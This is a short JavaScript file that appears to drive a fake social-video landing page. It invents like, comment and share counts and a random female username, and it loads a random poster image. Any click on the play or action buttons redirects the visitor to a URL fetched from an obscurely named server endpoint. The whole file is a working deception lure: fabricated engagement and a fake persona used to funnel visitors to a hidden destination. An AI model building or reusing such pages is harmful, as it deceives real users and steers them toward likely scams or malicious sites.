let chance_random = new Chance();
const liked = chance_random.integer({min: 5000, max: 20000})
const comme = chance_random.integer({min: 1000, max: 5000})
const shareit = chance_random.integer({min: 100, max: 1000})
const usernameit = chance_random.name({nationality:"en", gender:"female"}).replace(" ","").toLowerCase()
OcPwe01();
$("span.like_video").text(thousand(liked))
$("span.commented").text(thousand(comme))
$("span.share").text(thousand(shareit))
$("h3.userIt").text(`@${usernameit}`);
$("title").text(`@${usernameit}`);
$("div.play-btn, div.action-btn, div.story-info").on("click", async ()=>{
    const uri = await OxnMs();
    window.location.href = uri
})
async function OcPwe01(){
    const poste = await fetch("/poster");
    const thumb = await poste.json();
    const singelImage = chance_random.pickone(thumb);
    $("video").attr("poster", singelImage);
}
async function OxnMs(){
    const uri = await fetch("/0xO1901HjsKl");
    const uris = await uri.json();
    return uris.url;
}
function thousand(numb){
    const formatter = new Intl.NumberFormat('en', {
        notation: 'compact',
        compactDisplay: 'short'
    });
    return formatter.format(numb)
}